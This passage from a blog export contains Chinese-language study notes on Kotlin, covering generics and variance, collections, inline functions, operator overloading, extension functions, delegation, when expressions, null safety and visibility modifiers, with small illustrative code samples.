类，类型类的名称可以直接当作类型使用。例如，如果你这样写var x:String,就是声明了一个可以保存String类的实例的变量。但是注意，同样的类名称也可以用来声明可空类型var x:String?。这意味着每一个Kotlin类都可以用于构造至少两种类型。泛型类的情况就变得更复杂了。要得到一个合法的类型，需要用一个作为类型实参的具体类型替换（泛型）类的类型形参。List不是一个类型（它是一个类)，但是下面列举出来的所有替代品都是合法的类型：List&lt;Int&gt;,List&lt;String?&gt;,List&lt;List&lt;String&gt;&gt;,等。每一个泛型类都可能生成潜在的无限数量的类型。
简单的情况下，子类型和子类本质上意味着一样的事物。例如，Int类是Number的子类，因此Int类型是Number类型的子类型。如果一个类实现了一个接口，它的类型就是该接口类型的子类型：String是CharSequence的子类型。如果对于任意两种类型 A,B。MutableList&lt;A&gt;既不是 MutableList&lt;B&gt; 的子类型也不是它的超类型，它被称为在该类型参数上是不变型的。Java 中所有的类都是不变型的
协变，逆变使用out关键词约束就只能放在out位置上，同理in也一样。

协变：如果A是B的子类型，那么 Producer&lt;A&gt;就是Producer&lt;B&gt;的子类型。我们说子类型化被保留了 。


子类型化会被保留（ Producer&lt;Cat&gt;是 Producer &lt;Anirnal&gt; 的子类型）,也就是可以输出为子类型
只能用在 out 位置


逆变：



更多关键内容查看该文章

点变型使用out，in这些关键词就是声明点变型。但是有些不同的地方就在于，使用了点变型的都被称为类型投影，他们不是一个常规的类，而是一个可以返回类型是泛型参数类型的方法。例如你选择了一个Any的泛型类型，那么这个他最多只能使用Any的方法，至于他的儿子Int，String的特有方法都不能使用。
星号投影当类型实参的信息并不重要的时候，可以使用星号投影的语法：不需要使用任何在签名中引用类型参数的方法，或者只是读取数据而不关心它的具体类型。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(集合和数组）</title>
    <url>/posts/f45b89dd/</url>
    <content><![CDATA[持有可空类型元素和持有非空类型元素的集合变量自己类型的可空性和用作类型参数 类型 的可空性是有区别的集合中是允许可空值的。
只读集合和可变集合kotlin将访问集合的接口和访问数据的接口分开了。可变集合继承自只读集合，只读集合不可修改，可变集合在只读集合的基础上增加了添加，移除元素，清空集合等方法。
一般的规则是，在代码中都应该使用只读集合。只有在需要修改的地方才使用可变接口的变体。这在函数中接受参数时也更明确了什么什么集合是可修改的，什么时候只适用于读取。只读集合不能传递给可变集合，但是可变集合可以传递给只读集合
所以只读集合也并不总是线程安全的，在多线程环境下处理数据，需要保证代码的正确同步关系。
kotlin集合和java每一个kotlin接口都是对应java集合接口的一个实例。在kotlin和java之间转移并不需要转化：map也并没有继承自Collection和Iterable他也被表示为两种类型：只读和可变
java操作kotlin集合因为java不会区分可变和只读集合，所以从java调用kotliln的集合时，kotlin编译器不会拒绝java代码对集合做了什么，即便对只读集合进行了修改。对于非空类型也需要注意，在kotlin中声明了是非空类型，但是在java中仍然有可能会添加空值进去，所以需要对他进行单独的处理。
kotlin操作java集合需要根据实际情况给他添加上适当的约束，如是否可空，可变等。
对象和基本数据类型的数组
kotlin最常用的创建数组的情况之一是需要调用参数为数组的java方法。或是带有vararg参数的kotlin函数。通常情况下，数据已经存储在集合中，只需将其转化为数组即可。可以使用toTypeArray方法把他转为数组。然后数组可以通过*对他进行展开。转变为vararg的参数。数组类型的类型参数始终会变成对象类型因为大部分创建数组或者集合时，都是使用的泛型类，对于泛型，必然是对象类型进行存储。而在kotlin中，他提供了一些单独的类，用来专门存储基础数据类型的数组，如IntArray，ByteArray，BooleanArray等。这些都可以编译为java中的基本类型数组byte[],int[]等
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin函数特点</title>
    <url>/posts/29d73382/</url>
    <content><![CDATA[kotlin中的集合在kotlin中
fun main(args: Array&lt;String&gt;) &#123;    println(set.javaClass)    println(list.javaClass)    println(map.javaClass)&#125;val set = setOf(1,2,3)val list = arrayListOf(1,2,3,4)val map = mapOf(1 to &#x27;a&#x27;,2 to &#x27;b&#x27;)
他的输出结果为
class java.util.LinkedHashSetclass java.util.ArrayListclass java.util.LinkedHashMapProcess finished with exit code 0
也就是说明，在kotlin中，他并没有单独的集合类，而是采用了java的集合类。但是他相对于java的集合类又有一些特殊的方法，如last(),max()之类。
函数的相关细节
显示标明参数在kotlin中，kotlin可以直接显式的标明一些参数的名称，而不一定要通过顺序或者查看文档来获取应该如何填写参数。不过，如果使用了显示的标明参数，那么他之后的参数也必须都标明。

默认参数值在kotlin中有一个特别好用的技巧就是默认参数值，通过这个默认参数值，可以省略掉很多java中必须重载的方法（这些方法只是因为参数的类型和数量不同）。使用了默认参数值后便不需要使用这些重构。任何你没有填写的参数他都会直接用默认参数来代替。

考虑到java有与kotlin的互操型，如果java调用kotlin的函数，由于java没有默认参数的说法，所以可以在kotlin的方法上加上注解@JvmOverloads，然后编译器会自动生成所有重载方法，从最后一个省略每个参数


顶层函数在kotlin中，他可以直接有全局的函数和变量，这些函数和变量在经过编译器编译过后，会自动转化成public static的方法和public static final的属性，他所存在的类就是kt的文件名到时候会在编译时转化成类。此时这些函数都会转化为静态方法或者静态变量。如果下需要自定义类名，可以在这个文件最顶部加上注解@JvmName(&quot;你需要制定的类名“)然后在java中调用这些静态方法就可以使用类名.方法的方式来调用了


]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(内联函数)(高阶函数控制)</title>
    <url>/posts/15d97abc/</url>
    <content><![CDATA[内联函数首先，一般情况下。lambda 表达式会被正常地编译成匿名类。这表示每调用一次lambda 表达式，一个额外的类就会被创建。并且如果 lambda 捕捉了某个变量，那么每次调用的时候都会创建一个新的对象 这会带来运行时的额外开销，导致使lambda 比使用一个直接执行相同代码的函数效率更低。
而内联函数可以解决这个效率低下的问题，也就是使用inline关键字，他在编译后，不会是一个调用函数的代码，而是直接把函数体复制并替换到当前位置，然后直接执行。
使用条件一般情况下都可以使用，但是最推荐，当你使用lambda函数时，因为这样子可以最大的提高效率。而如果你使用的lambda函数已经被定义到某个具体的类中时，或者被作为一个参数接收起来。总而言之就是必须要现场写的lambda函数。他的使用才有意义。不然他将不会被内联进来，只会编译为调用函数的过程。
JVM自动内联对于普通的函数调用，JVM己经提供了强大的内联支持。它会分析代码的执行，并在任何通过内联能够带来好处的时候将函数调用内联。这是在将宇节码转换成机器代码时自动完成的。在字节码中，每一个函数的实现只会出现一次，并不需要跟Kotlin 的内联函数一样，每个调用的地方都拷贝一次。再说，如果函数被直接调用，调用只会更加清晰。
但是如果内联的代码太大也会很难看。
高阶函数控制如果我们使用lambda如forEach的函数时，就会很快遇到关于return的问题。因为他的return会直接从最外层的函数返回。

如果你在lambda函数中使用return，那么他默认会从调用lambda函数的函数中返回。并不只是从lambda函数返回。这个被称为非局部返回。

需要注意的是，只有在以 lambda 作为参数的函数是内联函数的时候才能从外层的函数返回。


如果我们要从lambda函数中局部返回，可以使用标签，或者从函数名返回。(类似于continue的实现)
//1 函数名&quot;123141&quot;.forEach &#123;            if (it == &#x27;1&#x27;) &#123;                return@forEach            &#125;        &#125;//2 标签&quot;123141&quot;.forEach lable@&#123;        if (it == &#x27;1&#x27;) &#123;            return@lable        &#125;    &#125;
一个 lambda 表达式的标签数量不能多于一个。也就是使用了标签，函数名就无法使用了。

匿名函数默认从lambda函数返回，也就是和普通的非内联lambda一致。


]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(运算符重载和其他约定）</title>
    <url>/posts/65b01aec/</url>
    <content><![CDATA[
在java中，有一些特定的类与语言特性相关联，例如使用了iterable接口的对象可以在for循环中使用。

而在kotlin中，也有很多与语言特性相关的函数命名，对，他与java并不一样，他是选择了将功能和函数命名来绑定。例如，如果在你的类中定义了一个名为 plus 的特殊方法，那么按照约定，就可以在该类的实例上使用+运算符。因此，在 Kotlin 中，我们把这种技术称为约定
约定因为他并不是强依赖于类和他的继承关系。在kotlin中使用约定可以在类中重载其方法，也可以通过扩展函数去添加约定，从而适应现有的java类而不用修改其代码。
运算符重载运算符重载所需要的关键词是operator，而且他所重载的方法都有特定的命名，都必须带上operator关键字。这些表达式同样也满足+-&#x2F;的基本运算规则。*



表达式
函数名



a * b
times


a + b
plus


a - b
minus


a &#x2F; b
div


a % b
mod


a * &#x3D; b
timesAssign


a + &#x3D; b
plusAssign


a % &#x3D; b
modAssign


a &#x2F; &#x3D; b
divAssign


a - &#x3D; b
minusAssign


+ a
unaryplus


- a
unaryminus


! a
not


a++,++a
inc


a–,–a
dec



如果从java中调用kotlin，那么可以很轻松的调用，因为每个重载的运算符都被定义为一个函数，可以像普通函数一样去调用。如果从kotlin调用java。java是不支持operator关键词的，只能写普通的函数，或者使用扩展函数来实现。

二元运算符*kotlin中的这些运算符重载是不支持交换性的，也就是p1.5和1.5*p是两个东西，p1.5是在p的类中，定义了一个times方法，接受double参数。而1.5p就是在Double类中定义了一个times方法接受p类的参数。**
简单点说，就是他的顺序有限制，一般是前一个参数是本类，用来实现调用方法，后一个参数是接受的参数。
复合运算符当你的代码中出现+&#x3D;时，一般会plus和plusAssign都可以响应，编译器有可能报错。通常情况下的解决办法是，plus都会返回一个新创建的类，所以一般用val去定义变量，直接用新地址去接受一个新变量。而plusAssign最好使用var，或者数组中相关的改变方法，这样才可以修改地址。在某些时候，这两个都是可以同时调用的，因此建议只用一个
一元运算符对于一元运算符，通常都是直接改变原值。而且对于他的++a,a++。kotlin库中也满足对应的顺序关系。
比较运算符equals和===和==的关系：在kotlin中的equals就是比较值的关系，他与&#x3D;&#x3D;是等价的。也就是重写了equals方法就可以调用&#x3D;&#x3D;这个运算规则。而===则是比较引用地址是否相同。

equals同样也是与&#x3D;&#x3D;规则一致的，但是他并不需要写operator关键词，只需要写override？

因为equals这个方法是定义在Any类上，也就是所有的类都继承了equals方法，而他的operator关键词在Any中就定义了，所以我们不需要在写这个关键词，只需要添加上override表示重写即可。还要注意，equals 不能实现为扩展函数，因为继承自 Any类的实现始终优先于扩展函数。
排序运算符直接使用比较符号运算都会调用compareTo方法。
在Java 中，类可以实现 Comparable 接口，以便在比较的算法中使用，例如在查找最大值或排序的时候。接口中定义的compareTo方法用于确定一个对象是否大于另一个对象 但是在 Java 中，这个方法的调用没有简明语法。只有基本数据类型能使用 来比较，所有其他类型都需要明确写为elementl compare To(element2）Kotlin 支持相同的 Comparable 接口。但是接口中定义的compare To 方法可以按约定调用，比较运算符（＜，＞，＜＝和＞＝） 的使用将被转换为 compareTo。
如果kotlin中实现了compareble接口，那么就可以直接重写compareTo而不使用operator关键字。
CompareValueBy是kotlin标准库中简洁的实现compareTo方法。。这个函数接收用来计算比较值的一系列回调，按顺序依次调用回调方法，两两一组分别做比较，并返回结果。而且这些回调可以使用lambda函数,如：
集合和区间的约定
通过集合下标访问元素他的本质就是调用了set和get方法。可以自己重写这些方法。而且你get，set方法可以与往常不一样，你还可以多设置几个参数，例如在二维数组的使用。operator fun get (rowindex: Int, colindex: Int ），然后用matrix [row,col ］来调用具体的值。set也是同理，只需要在相对应的get方法后，在多加一个value的参数即可。set 的最后一个参数用来接收赋值语句中（等号）右边的值，其他参数作为方括号内的下标

in的约定当坚持一个对象是否属于某个集合时，或者类是否有继承关系时，就可以用in，他与contains方法相关联。返回一个Boolean值。
rangeTo 的约定..会转化为rangeTo的函数。如果
for循环中使用iterator的约定如果是在for循环中，那么他使用的in运算符他就不是调用contains方法，而是调用iterator方法，他会自动的使用hasNext和Next方法。形成iterator的迭代。
解构声明和组件函数和循环他的关键就是允许你在一个函数中需要返回多个值时，可以用一个对象把他们存起来，然后获得对象后，用结构声明把这个对象的属性分别导出来。而且他最多支持一个对象里最多五个属性再多的他也无法导出来。
在循环中的使用就是例如可以把map中的key和value同时导出来。for((key,value) in map)。这样的就会很便利。
委托属性：重用属性访问的逻辑这个功能的基础是委托，他是一种设计模式。操作的对象不用执行，而是把工作委托给另一个辅助的对象。我们通过在另一个委托类中，定义getValue和setValue方法来实现把一个属性的get和set方法都交给另个一类实现。他有几个使用场景：

惰性初始化当我们初始化一个类时，如果直接把他所有的属性初始化完，会占用很大的内存。所以我们惰性初始化，只有当我们调用了get方法时，才会去完成初始化。

将逻辑都放到另一个类中统一处理。例如设置一个日志功能，使用set修改内容后，会打印修改内容。kotlin标准库中实现了一个类似的功能的类，你直接调用即可，而不用通过java去写他的具体实现。

实现细节


]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin处理集合：可变参数，中缀调用</title>
    <url>/posts/a1ba9580/</url>
    <content><![CDATA[
可变参数在kotlin中创建一个集合，可以往其中传递任意数量的参数进去。
fun listOf&lt;T&gt;(vararg values:T):List&lt;T&gt;&#123;...&#125;
在kotlin中，是直接使用vararg来说修饰可变参数的。而且kotlin和java的另一个区别就是java中，你可以按照原样传递某个数组进去，而kotlin需要你显式的对这个数组进行解包操作。例如
val list1 = listOf(&quot;1&quot;,&quot;2&quot;)val list2 = listOf(*list1,&quot;3&quot;)//最后list2的结果为[&quot;1&quot;,&quot;2&quot;,&quot;3&quot;]
这个功能被称为展开运算符

中缀调用和解构声明在kotlin中，创建一个map
val map = mapOf(1 to &quot;One&quot;,2 to &quot;Two&quot;)
这里的to就是不是一直欧冠你内置的结构，而是一种特殊的函数调用，被称为中缀调用。在kotlin中他有一个有与java不同的类，Pair，他用来表示一对元素而且他和to都用到了泛型。
1.to(&quot;one&quot;)//一般to函数的调用1 to &quot;one&quot;//使用中缀符号调用to函数
如果需要使用中缀符号，那么需要使用infix修饰符来标记
infix fun Any.to(other:Any) = Pair(this,other)
而解构声明就是把把Pair展开，用来初始化两个变量
val (number,name) = 1 to &quot;one&quot;
同样的，对于使用withIndex的数列也一样可行如：
for((index,element) in collection.withIndex())&#123;			...&#125;
字符分割和正则表达式相比与java中的split分割方法，kotlin对他进行了重写，使他更为直观。

可以直接通过任意数量的纯文本字符串进行分割，也就是直接调用split方法
采用正则表达式进行分割，kotlin在这引入了一个新类型，Regex，他可以将字符串转化为正则表达式，然后在split()函数中传入这个Regex，例如：println(&quot;12.346-A&quot;.split(&quot;\\.|-&quot;.toRegex()))//输出结果为[12,346,A]
 \.是用来转义的，因为.在正则中表示，任意的字面量


局部函数他的简单理解就是在函数中，将重复的代码提取成一个函数内的函数，化简代码。而且这个局部函数也可以扩展到外面。做了扩展的局部函数保证了，即便是同一个类，只有在某些时候，才能使用他的方法，比如验证过程，日志过程，就不需要该类在任意时刻都被用到


]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin异常</title>
    <url>/posts/2280ab3c/</url>
    <content><![CDATA[在kotlin中，他解决异常的方式与java类似，有两种共解决办法。

throw可以选择用throw来抛出异常。但是不一样的是，在kotlin中，他的throw是一个表达式，也就是throw可以作为一个值让其他的表达式使用。
try-cacth


可以像java一样使用try-catch
在kotlin中，try-catch也是表达式的形式。例如：val number = try&#123;	Integer.parseInt(reader.readLine())&#125;catch(e:NumberFormatException)&#123;	null&#125;
他会返回最后代码块中的最后一个表达式。而kotlin与java异常不同之处在java中有两种异常，受检异常和未受检异常。java必须显示的处理受检异常，例如IOException，而kotlin中，不区分受检异常和非受检异常。你不需要用throws来强制的抛出异常。

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin扩展函数</title>
    <url>/posts/fb49738c/</url>
    <content><![CDATA[Kotlin的又一大特色
给别人的类添加扩展函数和属性当我们在一个现有的java或者android项目中，需要添加kotlin的代码，而我们又不能把java等之类的代码全部转重写成kotlin，那会大大降低效率，而kotlin的扩展函数就很好的解决了这个办法。例如:我要获取字符串的最后一个字符：
fun main() &#123;    println(&quot;kotlin&quot;.lastChar())&#125;fun String.lastChar(): Char = this.get(this.length-1)
结果为
nProcess finished with exit code 0
在上述演示中，String表示接受类型，”kotlin“表示接受者对象，也就是接受类型的具体实例。然后，lastChar就是扩展的函数名，后面则是一个表达式体。这样子，就算为莫个类扩展了方法和属性。而且，不只是kotlin中，所有java，scale或者Groovy之类的JVM语言编写的都会被编译为java类，也就是都可以为这个类添加扩展。而且对于扩展函数而言，他就和其他成员变量一样，可以直接使用类中的方法，也就是默认在ths下。因此可以省略他，如下
fun String.lastChar(): Char = get(length-1)

但是扩展函数是在类之外定义的函数，他不能破坏类的封装性，所以相对于成员变量而言，扩展函数并不能访问私有或者受保护的变量。


扩展函数也需要从外部导入扩展函数并不会自动的在全局生效，尽管智能的IDE会帮你自动导入，但是你仍然需要明白，你必须通过import strings.lastChar类似上述模板的样子来导入方法。

从java中调用扩展函数以上述的扩展函数为例
char c = StringUtilKt.lastChar(&quot;JAVA&quot;)
这里，StringUtilKt是指包含这个属性的包名。从java中调用扩展函数时，他就和调用静态方法一样，只是这个接受者对象需要作为第一个参数传递到该方法中。形式如上。

扩展函数不能重写因为在通过JVM编译后，他实际上会被转化为静态函数，所以扩展函数重写并没有什么意义，如果重写了该方法，最后调用该方法只取决于是否该对象的静态类型，而不是他的运行时类型如下
open class A(val a: String) &#123;    fun showA() &#123;        println(a)    &#125;&#125;class AA(a:String):A(a)&#123;&#125;fun A.showDoubleA() &#123;    println(a)    println(a)&#125;fun AA.showDoubleA() &#123;    println(a)    println(a)    println(a)&#125;fun main()&#123;    val test:A = AA(&quot;2&quot;)    test.showDoubleA() &#125;//输出结果为22
扩展属性除了扩展方法外，你也可以扩展属性但是同样的，他会在JVM编译器中转化为静态属性，如果你定义的是val方法，那么这个属性将是不可变的，你需要自己去定义他的get方法，如果用var去定义，那你同时需要定义他的get和set方法。因为他没有默认支持的字段，也没有默认的get方法，同理，初始化也不可以，因为没有地方存储初始值通过java来调用扩展属性的话，必须使用get和set方法来获取，不能直接操作属性


]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin数组初始化</title>
    <url>/posts/e8e0fb17/</url>
    <content><![CDATA[Array今天在leetcode刷题时，突然发现，自己不会使用最基础的数组以及他的初始化。所以在这里说明一下

使用arrayOf()这是官方推荐的一种写法，他接受的时可变长参数，也就是可以接受任意的参数，直接生成一个数组。
使用arrayOfNull&lt;&gt;(n),初始化一个数组全为空，接受参数为数组的大小。
直接使用Array()生成数组。他又两种构造器


直接传递一个int，这个就是他的size。
除了传递一个int外，还可以传递一个lambda函数，作为数组的初始值。 

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin接口和控制继承，可见修饰符</title>
    <url>/posts/26344689/</url>
    <content><![CDATA[接口在kotlin中，也是使用interface来定义接口的。接口中，可以定义属性和方法，方法可以实现，也可以不实现。但是他们都是默认为open的，也就是可以被继承和重写的。

属性不能赋值，而且实现了这个接口的方法必须重写该属性，添加上get，set方法
未实现的方法在被之后的类实现时，必须把这个方法也同时实现了。
实现的方法（即带方法体的方法）可以不重写，而是直接使用。fun main()&#123;    B().showA()    B().showB()&#125;interface A&#123;    val sb:String    fun showA()&#123;        println(123)    &#125;    fun showB()&#123;        println(&quot;234&quot;)    &#125;&#125;class B(): A &#123;    override val sb: String        get() = sb&#125;
接口的使用还有一个问题：当两个接口，A，B都实现了showC的方法，而且都带有方法体。问：D类实现了A,B接口。那么D中使用showC会调用谁的方法？答：任何一个都不会，而是会编译报错即，如果同样的继承成员有不止一个实现，必须提供一个显式实现。Kotlin编译器强制要求你提供自己重写的方法：class C&#123;	override fun showC()&#123;		super&lt;A&gt;.showC()		super&lt;B&gt;.showC()	&#125;&#125;
在kotlin中，他也可以使用super的关键字，但是需要选定基类，也就是super&lt;&gt;的尖括号中，需要填写基类。

控制继承的修饰符


修饰符
相关成员
评注



final
不能被重写
类中成员默认使用


open
可以被重写
需要明确的表明，且open的属性会被继承


abstract
必须被重写
只能在抽象类中使用，抽象成员不能有实现


override
重写父亲或接口中的成员
如果没有使用final表明，重写的方法默认是开放的


可见性修饰符


修饰符
类成员
顶层声明



public（默认）
所有地方可见
所有地方可见


internal
模块中可见
模块中可见


protected
子类中可见
–


private
类中可见
文件中可见


对于kotlin和java的区别：

kotlin中没有默认类，或者说它默认就是public所有地方可见。
internal是新增的修饰符，他表示在一个模块中可见，这个模块可以是指一个idea项目，eclipse项目，maven，ant项目。也就是同一个项目中可见
protected对于java而言是同一个包内可见，而kotlin中化简为只在子类中可见。

然后在kotlin中，不允许可见度高的去调用可见度低的方法，如public不能调用internal，以此类推，保持一致。同样的外部类也不能看见内部类，如扩展函数是无法看到内部的protected，private方法的，保持了类的封闭性。
深入在jvm编译过程中，kotlin被编译为字节码文件时，public，protected，private被编译成java字节码时会被保留，他们也保持了同样的可见性。例外：private会被编译成类包私有声明，因为在java中，不能把类声明为private。
internal会被编译成public。
提出疑问？因为kotlin在编译为字节码后，和java的交互中，会有一些你在java中能访问，但是在kotlin中不能访问的内容，如：protected，在java的同一个包下能访问，但是kotlin中不能访问。这会导致什么？？
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin数据类和委托</title>
    <url>/posts/8293f6c6/</url>
    <content><![CDATA[数据类简单点说：使用data class关键字，声明一个数据类，该类会帮你自动重写toString(),equal(),HashCode()方法。通常来说，数据类的属性都是val的，即不可改变。因为通常创建数据类用于持续化数据维持，或者作为HashMap的一个键使用。而改变数据类的属性都会导致他本身失去意义。因此，kotlin为你提供了一个方法可以copy()本身。同时也可以修改某些属性值。
类委托使用by关键字。一个类的方法不在该类中定义，而是直接委托给另一个对象来处理。
修饰器模式这种模式的本质就是创建一个新类，实现与原始类一样的接口并将原来的类的实例作为一个字段保存。与原始类拥有同样行为的方法不用被修改，只需要直接转发到原始类的实例。简单点说就是给原始类套了一层壳，然后所有的接口的法方法直接转交给原始类去完成，只不过可以添加一些自定义的新方法，或者重写一部分的方法。如果在java中去实现，也没有问题，只是需要重复写很多的模板代码。而在kotlin中，他通过by关键字实现类委托。
interface Child&#123;    fun walk()&#123;        println(&quot;我会走路&quot;)    &#125;&#125;class Student:Child&#123;    fun call()&#123;        println(&quot;我会叫&quot;)    &#125;&#125;//class Teacher( child: Child = Student()):Child by child//现场创建一个类继承Childclass Teacher( child: Child = object:Child&#123;&#125;):Child by child//用一个单例去实现//当然在正常使用时。这里你可以直接传递一个参数进去，用来使用fun main() &#123;    Teacher().walk()&#125;
探究
如果这里重写了他的方法，是会将原始类的方法重写，还是只重写当前的类中的方法，于是做以下探究class Teacher(val child: Child = object:Child&#123;&#125;):Child by child&#123;    override fun walk() &#123;        super.walk()        println(&quot;干嘛&quot;)    &#125;&#125;//用一个单例去实现fun main() &#123;    Teacher().walk()    Teacher().child.walk()&#125;
结果为：也就是他并没有重写该类的方法，而是在底层自动将委托类的方法都模板套入了一遍。

对象委托一个类的属性不在该类中定义，而是直接委托给另一个对象来处理。
class Example &#123;    // 被委托属性    var prop: String by Delegate() // 基础对象&#125;// 基础类class Delegate &#123;    private var _realValue: String = &quot;彭&quot;    operator fun getValue(thisRef: Any?, property: KProperty&lt;*&gt;): String &#123;        println(&quot;getValue&quot;)        return _realValue    &#125;    operator fun setValue(thisRef: Any?, property: KProperty&lt;*&gt;, value: String) &#123;        println(&quot;setValue&quot;)        _realValue = value    &#125;&#125;fun main(args: Array&lt;String&gt;) &#123;    val e = Example()    println(e.prop)    // 最终调用 Delegate#getValue()    e.prop = &quot;Peng&quot;    // 最终调用 Delegate#setValue()    println(e.prop)    // 最终调用 Delegate#getValue()&#125;输出：getValue彭setValuegetValuePeng
基础类不需要实现任何接口，但必须提供 getValue() 方法，如果是委托可变属性，还需要提供 setValue()。在每个属性委托的实现的背后，Kotlin 编译器都会生成辅助属性并委托给它。 例如，对于属性 prop，会生成「辅助属性」 prop$delegate。 而 prop 的 getter() 和 setter() 方法只是简单地委托给辅助属性的 getValue() 和 setValue() 处理。
局部变量委托一个局部变量不在该方法中定义，而是直接委托给另一个对象来处理。
fun main(args: Array&lt;String&gt;) &#123;    val lazyValue: String by lazy &#123;        println(&quot;Lazy Init Completed!&quot;)        &quot;Hello World.&quot;    &#125;    if (true/*someCondition*/) &#123;        println(lazyValue) // 首次调用        println(lazyValue) // 后续调用    &#125;&#125;输出：Lazy Init Completed!Hello World.Hello World.]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin枚举类和“WHEN”,in</title>
    <url>/posts/bc432816/</url>
    <content><![CDATA[枚举类在kotlin中，有enum的一个所谓的软关键字，她只在class钱买你才有特殊意义，其他时候都是普通的名称使用。
enum class Color(val r: Int, val g: Int, val b: Int) &#123;    RED(255, 0, 0),    ORANGE(255, 165, 0),    YELLOW(255, 255, 0),    GREEN(0, 255, 0),    BLUE(0, 0, 255);//如果在枚举类中，有定义任何方法的话，需要将定义的常量后面加上分号来与方法分开    fun rgb() = (r * 256 + g) * 256 + b&#125;fun main() &#123;    println(Color.RED)&#125;
结果为
REDProcess finished with exit code 0
&#x2F;&#x2F;如果没有选择方法或者属性字段，她会默认输出他的名字。
when一些比较常用的方法
import Color.*fun getMnemonic(color: Color) =     when(color)&#123;        Color.RED -&gt; &quot;Richard&quot;        //可以在一个分支上合并多个选项        Color.BLUE,Color.ORANGE -&gt; &quot;MyColor&quot;        //导入枚举类常量后，可以直接省略Color        YELLOW -&gt; &quot;Yellow&quot;        else -&gt; throw Exception(&quot;Dirty color&quot;)    &#125;
when还可以使用任意对象。而且如果when没有传值进入的话，那么他的分支条件就是任意的布尔表达式。when中也不止以上的内容，她同时也可以完成智能转化，如果要添加日志的话，也可以使用代码体格式，代码块中的最后一个表达式将会成为结果返回
fun eval(e:Any) =    when(e)&#123;        //kotlin中的智能转化，当他用is判断了数据类型后，他会自动转化为该类型然后继续操作        is String -&gt; &quot;这个判断出错了&quot;        is Int -&gt; &#123;            //在使用代码块时，他会将最后一个表达式返回            println(&quot;这个判断没出错&quot;)            e        &#125;        else -&gt; &quot;这个没有结果&quot;    &#125;
用in来检查是否在某个区间内
fun main()&#123;    println(&quot;kotlin&quot; in &quot;java&quot;..&quot;scale&quot;)    println(&quot;kotlin&quot; in setOf(&quot;java&quot;,&quot;scale&quot;))&#125;
他的输出是这是因为字符串的比较是按照字母表顺序进行比较的
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin的foreach如何实现break和continue</title>
    <url>/posts/c7f9b665/</url>
    <content><![CDATA[如何在kotin的forEach中实现break和continue？先说结论
break的实现：fun main() &#123;    run&#123;        (1..10).forEach &#123;            if(it%3==0) return@run            println(it)        &#125;    &#125;&#125;//结果12
这是官方推荐的方法：但是这个实现break的方法有些丑陋，凭空添加一层壳子。而网上有关于类似的做法，比如通过filter或者find预知你要判断的数，但是往往我们的break的地方不能只是在开头或者结尾用来跳过某些数，如例子而是一些特定的逻辑后，可以结束循环。
continue的实现：fun main() &#123;    (1..10).forEach &#123;        if(it%3==0) return@forEach        println(it)    &#125;&#125;//结果12457810
这个比较好理解，所以不过多解释
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin空指针</title>
    <url>/posts/8f005380/</url>
    <content><![CDATA[在kotlin中，最为核心的一个内容就是kotlin的空安全判断。他可以通过?来简单的确定是否为空类型而接下来要说明的是let函数，对于任何一个类都继承了该方法。例如
obj.let&#123;obj2? -&gt;//编写具体的业务逻辑&#125;
可以看到，obj对象调用的let函数，后面是lambda表达式，他会直接obj对象本身传递到函数中，就是obj2，如果只有一个参数，也可以直接省略，用it代替。而let的特性让他特别适合处理空指针检查下面示例一个普通的空指针检查
fun doStudy(study: Study?)&#123;    	if(study != null)&#123;    		study.readBooks()    		study.doHomework()    &#125;&#125;
在kotlin中，你用if判断完后，他会自动检测，然后转化为非空的study类，然后就可以正常的调用。而如果使用let的话，就会是下面这种情况
fun doStudy(study: Study?)&#123;    	study?.let&#123;    		it.readBooks()    		it.doHomework()    &#125;&#125;
只有当study不是null时，才会执行let内的内容。只有以上内容或许还看不出let的好处。下面再介绍一个let可以处理全局变量的判空问题，而if无法做到
var study: Study? = nullfun doStudy()&#123;    	if(study !=null)&#123;    		study.readBooks()    		study.doHomework()    &#125;&#125;
这个函数再编译时会报错，因为对于全局的变量随时有可能会被其他线程修改。任然无法保证没有空指针风险，而通过let就不会有这种问题了。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin的private和java的private</title>
    <url>/posts/e71cd076/</url>
    <content><![CDATA[在kotlin中存在

修饰符1.1. 在 Kotlin 中，修饰符有：open&#x2F;final，private&#x2F;protected&#x2F;internal&#x2F;public1.2 open&#x2F;final：一个类能不能被继承。1.3. private&#x2F;protected&#x2F;internal&#x2F;public：一个类中或 Kotlin 文件中的变量或方法能不能被其他类或其他 Kotlin 文件访问。

open&#x2F;final2.1 一个类在类的定义前加上 open 修饰符才可以被继承。如果没有加 open 关键字，那么默认是 final，即不可被继承的。2.2 被 open 修饰的类中只有被 open 修饰的属性或方法才可以被子类重写，如果在属性或方法前没有加 open 关键字，那么默认是 final，是不可被覆盖重写的。2.3 在子类中覆盖重写父类中的属性或方法是，需要使用关键字 override 修饰。2.4 子类中重写了父类的属性或方法，那么此时子类中的属性或方法没有加 open 关键字，子类的子类也是可以重写的，也就是 override 默认是 open 的。如果不想被子类的子类进行重写，需要显示用 final 修饰。2.5 在 Kotlin 中，接口不需要加上 open 修饰符。接口本身和它内部的方法和属性都是默认加上 open 修饰符的，而普通类默认是加上 final 修饰符。而且在接口中也不能手动加上 final 修饰符，因为接口的作用就是为了抽象，如果不能被赋值或实现，那么接口就没用了。

